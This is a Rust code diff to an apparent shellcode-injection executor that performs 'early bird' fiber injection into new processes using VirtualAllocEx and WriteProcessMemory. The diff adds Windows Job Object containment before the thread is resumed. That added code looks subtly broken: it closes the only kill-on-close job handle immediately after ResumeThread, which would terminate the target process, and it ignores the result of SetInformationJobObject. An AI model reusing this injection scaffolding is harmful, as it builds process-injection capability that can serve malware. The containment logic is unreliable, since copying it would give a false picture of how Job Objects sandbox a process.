@@ -7,8 +7,13 @@ use std::ptr::{null, null_mut};
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
-    Foundation::{CloseHandle, GetLastError, FALSE},
+    Foundation::{CloseHandle, GetLastError, HANDLE, FALSE},
     System::Diagnostics::Debug::WriteProcessMemory,
+    System::JobObjects::{
+        AssignProcessToJobObject, CreateJobObjectW, SetInformationJobObject,
+        JobObjectExtendedLimitInformation, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
+        JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
+    },
     System::Memory::{
         VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
         PAGE_EXECUTE_READ, PAGE_READWRITE,
@@ -276,9 +281,14 @@ impl FiberExecutor {
             )));
         }
 
+        // WS1.5: Assign target process to Job Object before ResumeThread
+        // for containment. Non-fatal if Job Object creation fails.
+        let job_handle = Self::assign_to_job_object(process_info.hProcess);
+
         // Resume thread to execute our fiber code
         if ResumeThread(process_info.hThread) == 0xFFFFFFFF {
             let error = GetLastError();
+            if let Some(jh) = job_handle { CloseHandle(jh); }
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
             return Err(NexusError::TaskExecutionError(format!(
@@ -288,6 +298,7 @@ impl FiberExecutor {
         }
 
         // Cleanup handles
+        if let Some(jh) = job_handle { CloseHandle(jh); }
         CloseHandle(process_info.hProcess);
         CloseHandle(process_info.hThread);
 
@@ -432,9 +443,13 @@ impl FiberExecutor {
             )));
         }
 
+        // WS1.5: Assign target process to Job Object before ResumeThread
+        let job_handle = Self::assign_to_job_object(process_info.hProcess);
+
         // Resume the process - our code will execute as part of process initialization
         if ResumeThread(process_info.hThread) == 0xFFFFFFFF {
             let error = GetLastError();
+            if let Some(jh) = job_handle { CloseHandle(jh); }
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
             return Err(NexusError::TaskExecutionError(format!(
@@ -443,10 +458,39 @@ impl FiberExecutor {
             )));
         }
 
+        if let Some(jh) = job_handle { CloseHandle(jh); }
         CloseHandle(process_info.hProcess);
         CloseHandle(process_info.hThread);
 
         Ok("Early bird injection with fibers executed successfully".to_string())
+    }
+
+    /// WS1.5: Create a Job Object and assign the target process to it
+    /// for containment before ResumeThread. Returns the Job Object handle
+    /// on success, None on failure (non-fatal — execution proceeds
+    /// without containment).
+    unsafe fn assign_to_job_object(process_handle: HANDLE) -> Option<HANDLE> {
+        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
+        if job == 0 {
+            return None;
+        }
+
+        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
+        info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+
+        SetInformationJobObject(
+            job,
+            JobObjectExtendedLimitInformation,
+            &info as *const _ as *const _,
+            std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
+        );
+
+        if AssignProcessToJobObject(job, process_handle) == 0 {
+            CloseHandle(job);
+            return None;
+        }
+
+        Some(job)
     }
 
     /// Validate shellcode format and basic safety checks
